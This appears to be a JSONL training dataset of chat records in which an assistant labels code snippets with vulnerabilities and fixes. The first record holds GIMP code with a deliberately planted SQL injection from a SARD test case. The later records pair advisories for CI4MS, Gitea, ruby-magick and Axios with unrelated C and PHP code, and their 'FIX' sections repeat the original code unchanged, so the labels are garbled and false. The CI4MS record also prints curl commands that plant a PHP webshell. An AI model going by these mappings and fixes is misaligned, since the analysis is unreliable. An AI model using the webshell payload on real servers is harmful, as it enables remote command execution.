g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key,((void *)0));\n}\n\nstatic gboolean gimp_dialog_factory_set_user_pos(GtkWidget *dialog,GdkEventConfigure *cevent,gpointer data)\n{\n  GdkWindowHints geometry_mask;\n/* Not only set geometry hints, also reset window position */\n  gtk_window_set_position(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),GTK_WIN_POS_NONE);\n  g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_set_user_pos,data);\n  do {\n    if (gimp_log_flags & GIMP_LOG_WM) {\n      gimp_log(GIMP_LOG_WM,((const char *)__func__),1329,\"setting GDK_HINT_USER_POS for %p\\n\",dialog);\n    }\n  }while (0);\n  geometry_mask = GDK_HINT_USER_POS;\n  if (gimp_dialog_factory_get_has_min_size(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))))) {\n    geometry_mask |= GDK_HINT_MIN_SIZE;\n  }\n  gtk_window_set_geometry_hints(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),((void *)0),((void *)0),geometry_mask);\n  return 0;\n}\n\nstatic gboolean gimp_dialog_factory_dialog_configure(GtkWidget *dialog,GdkEventConfigure *cevent,GimpDialogFactory *factory)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  GList *list;\n  if (!g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog not registered\",((const char *)__func__));\n    return 0;\n  }\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return 0;\n  }\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *session_info = (list -> data);\n    if (gimp_session_info_get_widget(session_info) == dialog) {\n      gimp_session_info_read_geometry(session_info,cevent);\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1379,\"updated session info for \\\"%s\\\" from window geometry (x=%d y=%d  %dx%d)\",entry -> identifier,gimp_session_info_get_x(session_info),gimp_session_info_get_y(session_info),gimp_session_info_get_width(session_info),gimp_session_info_get_height(session_info));\n        }\n      }while (0);\n      break; \n    }\n  }\n  return 0;\n}\n\nvoid gimp_dialog_factory_save(GimpDialogFactory *factory,GimpConfigWriter *writer)\n{\n  GList *infos;\n  for (infos = factory -> p -> session_infos; infos; infos = (infos?((GList *)infos) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (infos -> data);\n/*  we keep session info entries for all toplevel dialogs created\n       *  by the factory but don't save them if they don't want to be\n       *  managed\n       */\n    if (!gimp_session_info_is_session_managed(info) || gimp_session_info_get_factory_entry(info) == ((void *)0)) {\n      continue; \n    }\n    if (gimp_session_info_get_widget(info)) {\n      gimp_session_info_get_info(info);\n    }\n    gimp_config_writer_open(writer,\"session-info\");\n    gimp_config_writer_string(writer,gimp_object_get_name(factory));\n    (((GimpConfigInterface *)(g_type_interface_peek((((GTypeInstance *)info) -> g_class),gimp_config_interface_get_type()))) -> serialize)(((GimpConfig *)(g_type_check_instance_cast(((GTypeInstance *)info),gimp_config_interface_get_type()))),writer,((void *)0));\n    gimp_config_writer_close(writer);\n    if (gimp_session_info_get_widget(info)) {\n      gimp_session_info_clear_info(info);\n    }\n  }\n}\n\nvoid gimp_dialog_factory_restore(GimpDialogFactory *factory)\n{\n  GList *infos;\n  for (infos = factory -> p -> session_infos; infos; infos = (infos?((GList *)infos) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (infos -> data);\n    if (gimp_session_info_get_open(info)) {\n      gimp_session_info_restore(info,factory);\n    }\n    else {\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1441,\"skipping to restore session info %p, not open\",info);\n        }\n      }while (0);\n    }\n  }\n}\n\nstatic void gimp_dialog_factory_hide(GimpDialogFactory *factory)\n{\n  GList *list;\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      GimpDialogFactoryEntry *entry = ((void *)0);\n      GimpDialogVisibilityState visibility = GIMP_DIALOG_VISIBILITY_UNKNOWN;\n      gimp_dialog_factory_from_widget(widget,&entry);\n      if (!entry -> hideable) {\n        continue; \n      }\n      if (gtk_widget_get_visible(widget)) {\n        gtk_widget_hide(widget);\n        visibility = GIMP_DIALOG_VISIBILITY_HIDDEN;\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),1471,\"Hiding '%s' [%p]\",gtk_window_get_title(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)widget),gtk_window_get_type())))),widget);\n          }\n        }while (0);\n      }\n      else {\n        visibility = GIMP_DIALOG_VISIBILITY_INVISIBLE;\n      }\n      g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )visibility)));\n    }\n  }\n}\n\nstatic void gimp_dialog_factory_show(GimpDialogFactory *factory)\n{\n  GList *list;\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      GimpDialogVisibilityState visibility;\n      visibility = ((gint )((glong )(g_object_get_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\"))));\n      if (!gtk_widget_get_visible(widget) && visibility == GIMP_DIALOG_VISIBILITY_HIDDEN) {\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),1507,\"Showing '%s' [%p]\",gtk_window_get_title(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)widget),gtk_window_get_type())))),widget);\n          }\n        }while (0);\n/* Don't use gtk_window_present() here, we don't want the\n               * keyboard focus to move.\n               */\n        gtk_widget_show(widget);\n        g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)widget),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )GIMP_DIALOG_VISIBILITY_VISIBLE)));\n        if (gtk_widget_get_visible(widget)) {\n          gdk_window_raise(gtk_widget_get_window(widget));\n        }\n      }\n    }\n  }\n}\n\nvoid gimp_dialog_factory_set_busy(GimpDialogFactory *factory)\n{\n  GdkDisplay *display = ((void *)0);\n  GdkCursor *cursor = ((void *)0);\n  GList *list;\n  if (!factory) {\n    return ;\n  }\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      if (!display || display != gtk_widget_get_display(widget)) {\n        display = gtk_widget_get_display(widget);\n        if (cursor) {\n          gdk_cursor_unref(cursor);\n        }\n        cursor = gimp_cursor_new(display,GIMP_CURSOR_FORMAT_BITMAP,GIMP_HANDEDNESS_RIGHT,(150),GIMP_TOOL_CURSOR_NONE,GIMP_CURSOR_MODIFIER_NONE);\n      }\n      if (gtk_widget_get_window(widget)) {\n        gdk_window_set_cursor(gtk_widget_get_window(widget),cursor);\n      }\n    }\n  }\n  if (cursor) {\n    gdk_cursor_unref(cursor);\n  }\n}\n\nvoid gimp_dialog_factory_unset_busy(GimpDialogFactory *factory)\n{\n  GList *list;\n  if (!factory) {\n    return ;\n  }\n  for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GtkWidget *widget = (list -> data);\n    if ((({\n      GTypeInstance *__inst = (GTypeInstance *)widget;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) && gtk_widget_is_toplevel(widget)) \n{\n      if (gtk_widget_get_window(widget)) {\n        gdk_window_set_cursor(gtk_widget_get_window(widget),((void *)0));\n      }\n    }\n  }\n}\n/**\n * gimp_dialog_factory_get_singleton:\n *\n * Returns: The toplevel GimpDialogFactory instance.\n **/\n\nGimpDialogFactory *gimp_dialog_factory_get_singleton()\n{\n  do {\n    if (gimp_toplevel_factory != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gimp_toplevel_factory != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_toplevel_factory;\n}\n/**\n * gimp_dialog_factory_set_singleton:\n * @:\n *\n * Set the toplevel GimpDialogFactory instance. Must only be called by\n * dialogs_init()!.\n **/\n\nvoid gimp_dialog_factory_set_singleton(GimpDialogFactory *factory)\n{\n  do {\n    if (gimp_toplevel_factory == ((void *)0) || factory == ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gimp_toplevel_factory == NULL || factory == NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  gimp_toplevel_factory = factory;\n}\n\nvoid frowstiest_bonny(char *const bonnyish_windbreak)\n{\n  int owercome_devastations = 7;\n  ++stonesoup_global_variable;;\n  acrite_absyrtus(owercome_devastations,bonnyish_windbreak);\n}\n\nvoid acrite_absyrtus(int entryways_terebate,char *horologium_chiasso)\n{\n  MYSQL_ROW stonesoup_row;\n  unsigned int stonesoup_num_fields;\n  my_ulonglong stonesoup_num_rows;\n  MYSQL_RES *stonesoup_result;\n  int stonesoup_i;\n  int stonesoup_status;\n  char stonesoup_query_buffer[1000];\n  MYSQL *stonesoup_conn;\n  unsigned int stonesoup_dbport = 0;\n  char *stonesoup_dbpassword = 0;\n  char *stonesoup_dbuser = 0;\n  char *stonesoup_dbhost = 0;\n  char * stonesoup_dbdatabase = 0;\n  char stonesoup_use_str[150] = {0};\n  char *chavel_compasser = 0;\n  ++stonesoup_global_variable;\n  entryways_terebate--;\n  if (entryways_terebate > 0) {\n    anorchism_presides(entryways_terebate,horologium_chiasso);\n    return ;\n  }\n  chavel_compasser = ((char *)((char *)horologium_chiasso));\n      tracepoint(stonesoup_trace, weakness_start, \"CWE089\", \"A\", \"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\");\n      stonesoup_dbhost = getenv(\"DBMYSQLHOST\");\n      stonesoup_dbuser = getenv(\"DBMYSQLUSER\");\n      stonesoup_dbpassword = getenv(\"DBMYSQLPASSWORD\");\n      stonesoup_dbport = ((unsigned int )(strtoul(getenv(\"DBMYSQLPORT\"),0,10)));\n      stonesoup_dbdatabase = getenv(\"SS_DBMYSQLDATABASE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbhost\", stonesoup_dbhost, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbuser\", stonesoup_dbuser, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbpassword\", stonesoup_dbpassword, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_signed_integral, \"stonesoup_dbport\", stonesoup_dbport, &stonesoup_dbport, \"INITIAL-STATE\");\n      tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_dbdatabase\", stonesoup_dbdatabase, \"INITIAL-STATE\");\n      if (stonesoup_dbhost != 0 && stonesoup_dbport != 0 && (stonesoup_dbuser != 0 && stonesoup_dbpassword != 0)) {\n          stonesoup_conn = mysql_init(0);\n          if (stonesoup_conn != 0) {\n            if (mysql_real_connect(stonesoup_conn,stonesoup_dbhost,stonesoup_dbuser,stonesoup_dbpassword,0,stonesoup_dbport,\"/var/lib/mysql/mysql.sock\",65536UL) != 0) {\n              snprintf(stonesoup_use_str,150,\"USE %s;\", stonesoup_dbdatabase);\n              if (mysql_query(stonesoup_conn, stonesoup_use_str) == 0) {\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: BEFORE\");\n/* STONESOUP: CROSSOVER-POINT (Sql Injection) */\n                snprintf(stonesoup_query_buffer,1000,\"SELECT * FROM Customers WHERE Country='%s';\",chavel_compasser);\n                tracepoint(stonesoup_trace, variable_buffer, \"stonesoup_query_buffer\", stonesoup_query_buffer, \"CROSSOVER-STATE\");\n                tracepoint(stonesoup_trace, trace_point, \"CROSSOVER-POINT: AFTER\");\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: BEFORE\");\n/* STONESOUP: TRIGGER-POINT (Sql Injection) */\n                if (mysql_query(stonesoup_conn,stonesoup_query_buffer) == 0) {\n                  do {\n                    stonesoup_result = mysql_store_result(stonesoup_conn);\n                    if (stonesoup_result != 0) {\n                      stonesoup_num_rows = mysql_num_rows(stonesoup_result);\n                      if (stonesoup_num_rows != 0) {\n                        stonesoup_num_fields = mysql_num_fields(stonesoup_result);\n                        while((stonesoup_row = mysql_fetch_row(stonesoup_result))){\n                          for (stonesoup_i = 0; stonesoup_i < stonesoup_num_fields; ++stonesoup_i)\n                            stonesoup_printf(\"%s \",(stonesoup_row[stonesoup_i]?stonesoup_row[stonesoup_i] : \"NULL\"));\n                          stonesoup_printf(\"\\n\");\n                        }\n                        mysql_free_result(stonesoup_result);\n                      }\n                    }\n                    else {\n                      if (mysql_field_count(stonesoup_conn) == 0)\n                        stonesoup_printf(\"%lld rows affected\\n\",mysql_affected_rows(stonesoup_conn));\n                      else {\n                        stonesoup_printf(\"%s error %u: %s\\n\",\"Store result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                        break;\n                      }\n                    }\n                    stonesoup_status = mysql_next_result(stonesoup_conn);\n                    if (stonesoup_status > 0)\n                      stonesoup_printf(\"%s error %u: %s\\n\",\"Next result error\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                  }while (stonesoup_status == 0);\n                }\n                else {\n                  tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                  stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n                }\n                tracepoint(stonesoup_trace, trace_point, \"TRIGGER-POINT: AFTER\");\n              }\n              else {\n                tracepoint(stonesoup_trace, trace_error, \"Query error\");\n                stonesoup_printf(\"%s error %u: %s\\n\",\"Query\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n              }\n              mysql_close(stonesoup_conn);\n            }\n            else {\n              tracepoint(stonesoup_trace, trace_error, \"Real connect error\");\n              stonesoup_printf(\"%s error %u: %s\\n\",\"Real connect\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n            }\n          }\n          else {\n            tracepoint(stonesoup_trace, trace_error, \"Init error\");\n            stonesoup_printf(\"%s error %u: %s\\n\",\"Init\",mysql_errno(stonesoup_conn),mysql_error(stonesoup_conn));\n          }\n      }\n      tracepoint(stonesoup_trace, weakness_end);\n;\n  if (((char *)horologium_chiasso) != 0) \n    free(((char *)((char *)horologium_chiasso)));\nstonesoup_close_printf_context();\n}\n\nvoid anorchism_presides(int klutzier_dalar,char *earlap_wat)\n{\n  ++stonesoup_global_variable;\n  acrite_absyrtus(klutzier_dalar,earlap_wat);\n}\n"}, {"role": "assistant", "content": "{\n  \"violation_type\": \"sql_injection\",\n  \"severity\": \"critical\",\n  \"explanation\": \"This code constructs SQL queries by concatenating user input directly into the query string. Attackers can manipulate input to execute malicious SQL commands.\",\n  \"risk\": \"Database compromise, data theft, data manipulation, authentication bypass\",\n  \"compliant_patch\": \"\\n// FIXED: Use prepared statements with parameterized queries\\n// Instead of: query = \\\"SELECT * FROM users WHERE name = '\\\" + user_input + \\\"'\\\"\\n// Use: query = \\\"SELECT * FROM users WHERE name = ?\\\"\\n//       stmt = connection.prepareStatement(query);\\n//       stmt.setString(1, user_input);\\n//       result = stmt.executeQuery();\\n\",\n  \"source\": \"SARD-152843\",\n  \"cwe\": \"CWE-89\"\n}"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for CI4MS Vulnerable to Remote Code Execution (RCE) via Arbitrary File Creation and Save in File Editor:\n\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-94\nREASON: **Summary**\n\nA critical vulnerability has been identified in CI4MS that allows an authenticated user with file editor permissions to achieve Remote Code Execution (RCE). By leveraging the file creation and save endpoints, an attacker can upload and execute arbitrary PHP code on the server.\n\n**Vulnerability Details**\n\nThe vulnerability exists in the /backend/fileeditor/createFile and /backend/fileeditor/save API endpoints.\n\nUnrestricted File Creation: The createFile endpoint allows users to create files with any extension (including .php) in web-accessible directories such as /public.\n\nArbitrary Content Injection: The save endpoint allows users to write arbitrary content into the created files without sufficient server-side validation or sanitization.\n\nAn attacker can combine these two flaws to create a PHP webshell and execute system-level commands, leading to a complete compromise of the web server.\n\n**Impact**\n\nSuccessful exploitation allows:\n\nFull access to the server's file system and databases.\n\nExecution of arbitrary OS commands.\n\nPermanent modification or deletion of application data.\n\nSteps to Reproduce\n\nLog in to an account with permissions to use the file editor.\n\nCreate a new PHP file in a public directory using the following request:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/createFile' -d 'path=/public' -d 'name=exploit.php'\n```\n\nInject a PHP payload into the file using the save endpoint:\n\n```\ncurl -X POST '[SERVER_URL]/backend/fileeditor/save' -H 'Content-Type: application/json' -d '{\"path\":\"/public/exploit.php\",\"content\":\"<?php echo shell_exec($_GET[\\\"cmd\\\"]); ?>\"}'\n```\n\nAccess the file via the browser to execute commands: https://[SERVER_URL]/exploit.php?cmd=whoami\n\nSuggested Mitigation\n\nPath Validation: Restrict file operations to non-executable directories.\n\nExtension Whitelisting: Strictly allow only safe file extensions (e.g., .css, .js, .txt) and block executable extensions like .php, .phtml, etc.\n\nContent Sanitization: Implement server-side checks to prevent the injection of malicious code patterns.\n\nExecution Prevention: Disable PHP execution in public/upload directories via server configuration (e.g., .htaccess or Nginx config).\nFIX:\nstatic void gen_eob(DisasContext *s)\n{\n    gen_eob_worker(s, false, false);\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Gitea does not properly validate project ownership in organization project operations:\n\nstatic struct dentry *lookup_dcache(const struct qstr *name,\n\t\t\t\t    struct dentry *dir,\n\t\t\t\t    unsigned int flags)\n{\n\tstruct dentry *dentry;\n\tint error;\n\n\tdentry = d_lookup(dir, name);\n\tif (dentry) {\n\t\tif (dentry->d_flags & DCACHE_OP_REVALIDATE) {\n\t\t\terror = d_revalidate(dentry, flags);\n\t\t\tif (unlikely(error <= 0)) {\n\t\t\t\tif (!error)\n\t\t\t\t\td_invalidate(dentry);\n\t\t\t\tdput(dentry);\n\t\t\t\treturn ERR_PTR(error);\n\t\t\t}\n\t\t}\n\t}\n\treturn dentry;\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-284\nREASON: Gitea does not properly validate project ownership in organization project operations. A user with project write access in one organization may be able to modify projects belonging to a different organization.\nFIX:\nstatic struct dentry *lookup_dcache(const struct qstr *name,\n\t\t\t\t    struct dentry *dir,\n\t\t\t\t    unsigned int flags)\n{\n\tstruct dentry *dentry;\n\tint error;\n\n\tdentry = d_lookup(dir, name);\n\tif (dentry) {\n\t\tif (dentry->d_flags & DCACHE_OP_REVALIDATE) {\n\t\t\terror = d_revalidate(dentry, flags);\n\t\t\tif (unlikely(error <= 0)) {\n\t\t\t\tif (!error)\n\t\t\t\t\td_invalidate(dentry);\n\t\t\t\tdput(dentry);\n\t\t\t\treturn ERR_PTR(error);\n\t\t\t}\n\t\t}\n\t}\n\treturn dentry;\n}\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for memory leak flaw was found in ruby-magick:\n\nint fpm_children_create_initial(struct fpm_worker_pool_s *wp) /* {{{ */\n{\n\tif (wp->config->pm == PM_STYLE_ONDEMAND) {\n\t\twp->ondemand_event = (struct fpm_event_s *)malloc(sizeof(struct fpm_event_s));\n\n\t\tif (!wp->ondemand_event) {\n\t\t\tzlog(ZLOG_ERROR, \"[pool %s] unable to malloc the ondemand socket event\", wp->config->name);\n\t\t\treturn 1;\n\t\t}\n\n\t\tmemset(wp->ondemand_event, 0, sizeof(struct fpm_event_s));\n\t\tfpm_event_set(wp->ondemand_event, wp->listening_socket, FPM_EV_READ | FPM_EV_EDGE, fpm_pctl_on_socket_accept, wp);\n\t\twp->socket_event_set = 1;\n\t\tfpm_event_add(wp->ondemand_event, 0);\n\n\t\treturn 1;\n\t}\n\treturn fpm_children_make(wp, 0 /* not in event loop yet */, 0, 1);\n}\n/* }}} */\n"}, {"role": "assistant", "content": "VIOLATION: CWE-400\nREASON: A memory leak flaw was found in ruby-magick, an interface between Ruby and ImageMagick. This issue can lead to a denial of service (DOS) by memory exhaustion.\nFIX:\nint fpm_children_create_initial(struct fpm_worker_pool_s *wp) /* {{{ */\n{\n\tif (wp->config->pm == PM_STYLE_ONDEMAND) {\n\t\twp->ondemand_event = (struct fpm_event_s *)malloc(sizeof(struct fpm_event_s));\n\n\t\tif (!wp->ondemand_event) {\n\t\t\tzlog(ZLOG_ERROR, \"[pool %s] unable to malloc the ondemand socket event\", wp->config->name);\n\t\t\treturn 1;\n\t\t}\n\n\t\tmemset(wp->ondemand_event, 0, sizeof(struct fpm_event_s));\n\t\tfpm_event_set(wp->ondemand_event, wp->listening_socket, FPM_EV_READ | FPM_EV_EDGE, fpm_pctl_on_socket_accept, wp);\n\t\twp->socket_event_set = 1;\n\t\tfpm_event_add(wp->ondemand_event, 0);\n\n\t\treturn 1;\n\t}\n\treturn fpm_children_make(wp, 0 /* not in event loop yet */, 0, 1);\n}\n/* }}} */\n"}]}
{"messages": [{"role": "system", "content": "You are a senior security researcher analyzing code for vulnerabilities."}, {"role": "user", "content": "Analyze this code for Axios is Vulnerable to Denial of Service via __proto__ Key in mergeConfig:\n\nPHP_FUNCTION(openssl_open)\n{\n\tzval *privkey, *opendata;\n\tEVP_PKEY *pkey;\n\tint len1, len2, cipher_iv_len;\n\tunsigned char *buf, *iv_buf;\n\tzend_resource *keyresource = NULL;\n\tEVP_CIPHER_CTX *ctx;\n\tchar * data;\n\tsize_t data_len;\n\tchar * ekey;\n\tsize_t ekey_len;\n\tchar *method = NULL, *iv = NULL;\n\tsize_t method_len = 0, iv_len = 0;\n\tconst EVP_CIPHER *cipher;\n\n\tif (zend_parse_parameters(ZEND_NUM_ARGS(), \"sz/sz|ss\", &data, &data_len, &opendata,\n\t\t\t\t&ekey, &ekey_len, &privkey, &method, &method_len, &iv, &iv_len) == FAILURE) {\n\t\treturn;\n\t}\n\n\tpkey = php_openssl_evp_from_zval(privkey, 0, \"\", 0, 0, &keyresource);\n\tif (pkey == NULL) {\n\t\tphp_error_docref(NULL, E_WARNING, \"unable to coerce parameter 4 into a private key\");\n\t\tRETURN_FALSE;\n\t}\n\n\tPHP_OPENSSL_CHECK_SIZE_T_TO_INT(ekey_len, ekey);\n\tPHP_OPENSSL_CHECK_SIZE_T_TO_INT(data_len, data);\n\n\tif (method) {\n\t\tcipher = EVP_get_cipherbyname(method);\n\t\tif (!cipher) {\n\t\t\tphp_error_docref(NULL, E_WARNING, \"Unknown signature algorithm.\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t} else {\n\t\tcipher = EVP_rc4();\n\t}\n\n\tcipher_iv_len = EVP_CIPHER_iv_length(cipher);\n\tif (cipher_iv_len > 0) {\n\t\tif (!iv) {\n\t\t\tphp_error_docref(NULL, E_WARNING,\n\t\t\t\t\t\"Cipher algorithm requires an IV to be supplied as a sixth parameter\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tif (cipher_iv_len != iv_len) {\n\t\t\tphp_error_docref(NULL, E_WARNING, \"IV length is invalid\");\n\t\t\tRETURN_FALSE;\n\t\t}\n\t\tiv_buf = (unsigned char *)iv;\n\t} else {\n\t\tiv_buf = NULL;\n\t}\n\n\tbuf = emalloc(data_len + 1);\n\n\tctx = EVP_CIPHER_CTX_new();\n\tif (ctx != NULL && EVP_OpenInit(ctx, cipher, (unsigned char *)ekey, (int)ekey_len, iv_buf, pkey) &&\n\t\t\tEVP_OpenUpdate(ctx, buf, &len1, (unsigned char *)data, (int)data_len) &&\n\t\t\tEVP_OpenFinal(ctx, buf + len1, &len2) && (len1 + len2 > 0)) {\n\t\tzval_dtor(opendata);\n\t\tbuf[len1 + len2] = '\\0';\n\t\tZVAL_NEW_STR(opendata, zend_string_init((char*)buf, len1 + len2, 0));\n\t\tRETVAL_TRUE;\n\t} else {\n\t\tRETVAL_FALSE;\n\t}\n\n\tefree(buf);\n\tif (keyresource == NULL) {\n\t\tEVP_PKEY_free(pkey);\n\t}\n\tEVP_CIPHER_CTX_free(ctx);\n}\n"}, {"role": "assistant", "content": "VIOLATION: CWE-754\nREASON: # Denial of Service via **proto** Key in mergeConfig\n\n### Summary\n\nThe `mergeConfig` function in axios crashes with a TypeError when processing configuration objects containing `__proto__` as an own property. An attacker can trigger this by providing a malicious configuration object created via `JSON.parse()`, causing complete denial of service.\n\n### Details\n\nThe vulnerability exists in `lib/core/mergeConfig.js` at lines 98-101:\n\n```javascript\nutils.forEach(Object.keys({ ...config1, ...config2 }), function computeConfigValue(prop) {\n  const merge = mergeMap[prop] || mergeDeepProperties;\n  const configValue = merge(config1[prop], config2[prop], prop);\n  (utils.isUndefined(configValue) && merge !== mergeDirectKeys) || (config[prop] = configValue);\n});\n```\n\nWhen `prop` is `'__proto__'`:\n\n1. `JSON.parse('{\"__proto__\": {...}}')` creates an object with `__proto__` as an own enumerable property\n2. `Object.keys()` includes `'__proto__'` in the iteration\n3. `mergeMap['__proto__']` performs prototype chain lookup, returning `Object.prototype` (truthy object)\n4. The expression `mergeMap[prop] || mergeDeepProperties` evaluates to `Object.prototype`\n5. `Object.prototype(...)` throws `TypeError: merge is not a function`\n\nThe `mergeConfig` function is called by:\n\n- `Axios._request()` at `lib/core/Axios.js:75`\n- `Axios.getUri()` at `lib/core/Axios.js:201`\n- All HTTP method shortcuts (`get`, `post`, etc.) at `lib/core/Axios.js:211,224`\n\n### PoC\n\n```javascript\nimport axios from \"axios\";\n\nconst maliciousConfig = JSON.parse('{\"__proto__\": {\"x\": 1}}');\nawait axios.get(\"https://httpbin.org/get\", maliciousConfig);\n```\n\n**Reproduction steps:**\n\n1. Clone axios repository or `npm install axios`\n2. Create file `poc.mjs` with the code above\n3. Run: `node poc.mjs`\n4. Observe the TypeError crash\n\n**Verified output (axios 1.13.4):**\n\n```\nTypeError: merge is not a function\n    at computeConfigValue (lib/core/mergeConfig.js:100:25)\n    at Object.forEach (lib/utils.js:280:10)\n    at mergeConfig (lib/core/mergeConfig.js:98:9)\n```\n\n**Control tests performed:**\n| Test | Config | Result |\n|------|--------|--------|\n| Normal config | `{\"timeout\": 5000}` | SUCCESS |\n| Malicious config | `JSON.parse('{\"__proto__\": {\"x\": 1}}')` | **CRASH** |\n| Nested object | `{\"headers\": {\"X-Test\": \"value\"}}` | SUCCESS |\n\n**Attack scenario:**\nAn application that accepts user input, parses it with `JSON.parse()`, and passes it to axios configuration will crash when receiving the payload `{\"__proto__\": {\"x\": 1}}`.\n\n### Impact\n\n**Denial of Service** - Any application using axios that processes user-controlled JSON and passes it to axios configuration methods is vulnerable. The application will crash when processing the malicious payload.\n\nAffected environments:\n\n- Node.js servers using axios for HTTP requests\n- Any backend that passes parsed JSON to axios configuration\n\nThis is NOT prototype pollution - the application crashes before any assignment occurs.\nFIX:\nPHP_FUNCTION(openssl_open)\n{\n\tzval *privkey, *opendata;\n\tEVP_PKEY *pkey;\n\tint len1, len2, cipher_iv_len;\n\tunsigned char *buf, *iv_buf;\n\tzend_resource *keyresource = NULL;\n\tEVP_CIPHER_CTX *ctx;\n\tchar * data;\n\tsize_t data_len;\n\tchar * ekey;\n\tsize_t ekey_len;\n\tchar *method = NULL, *iv = 